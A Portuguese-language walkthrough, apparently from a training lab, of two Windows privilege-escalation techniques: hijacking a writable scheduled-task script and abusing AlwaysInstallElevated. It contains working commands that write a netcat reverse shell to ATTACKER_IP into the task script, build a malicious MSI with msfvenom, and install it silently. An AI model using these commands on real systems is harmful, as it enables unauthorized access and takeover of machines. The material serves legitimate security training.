---
tags:
  - EXPLOITATION
  - Windows
---
# Tarefas programadas

Ao examinar as tarefas agendadas no sistema de destino, você poderá ver uma tarefa agendada que perdeu seu binário ou está usando um binário que pode ser modificado.

As tarefas agendadas podem ser listadas na linha de comando usando o comando schtasks sem nenhuma opção. Para obter informações detalhadas sobre qualquer um dos serviços, você pode usar um comando como o seguinte:

```powershell
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

Você obterá muitas informações sobre a tarefa, mas o que importa para nós é o parâmetro "Task to Run", que indica o que é executado pela tarefa agendada, e o parâmetro "Run As User", que mostra o usuário que será usado para executar a tarefa.

Se o nosso usuário atual puder modificar ou sobrescrever o executável "Task to Run", poderemos controlar o que é executado pelo usuário taskusr1, resultando em um simples escalonamento de privilégios. Para verificar as permissões de arquivo no executável, usamos o `icacls`:

```powershell
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

Como pode ser visto no resultado, o grupo BUILTIN\Users tem acesso total (F) ao binário da tarefa. Isso significa que podemos modificar o arquivo .bat e inserir qualquer carga útil que desejarmos. Para sua conveniência, o nc64.exe pode ser encontrado em C:\tools. Vamos alterar o arquivo bat para gerar um shell reverso:

```powershell
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

Em seguida, iniciamos um ouvinte na máquina do atacante na mesma porta que indicamos em nosso shell reverso:

```shell
nc -lvp 4444
```

Na próxima vez que a tarefa agendada for executada, você deverá receber o shell reverso com privilégios de taskusr1. Embora você provavelmente não consiga iniciar a tarefa em um cenário real e tenha que esperar que a tarefa agendada seja acionada, fornecemos ao seu usuário permissões para iniciar a tarefa manualmente para economizar tempo. Podemos executar a tarefa com o seguinte comando:

```powershell
C:\> schtasks /run /tn vulntask
```

E você receberá o shell reverso com privilégios de taskusr1, conforme esperado:

```powershell
user@attackerpc$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```

# AlwaysInstallElevated

Os arquivos do instalador do Windows (também conhecidos como arquivos .msi) são usados para instalar aplicativos no sistema. Normalmente, eles são executados com o nível de privilégio do usuário que os inicia. No entanto, eles podem ser configurados para serem executados com privilégios mais altos a partir de qualquer conta de usuário (mesmo as sem privilégios). Isso poderia nos permitir gerar um arquivo MSI malicioso que seria executado com privilégios de administrador.

Observação: o método AlwaysInstallElevated não funcionará no computador desta sala e foi incluído apenas como informação.

Esse método requer a definição de dois valores de registro. Você pode consultá-los na linha de comando usando os comandos abaixo.

```powershell
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Para poder explorar essa vulnerabilidade, ambos devem ser definidos. Caso contrário, a exploração não será possível. Se estiverem definidos, você poderá gerar um arquivo .msi malicioso usando o msfvenom, conforme mostrado abaixo:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.79.220 LPORT=LOCAL_PORT -f msi -o malicious.msi
```

Como esse é um shell reverso, você também deve executar o módulo Metasploit Handler configurado de acordo. Depois de transferir o arquivo que criou, você pode executar o instalador com o comando abaixo e receber o shell reverso:

```powershell
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```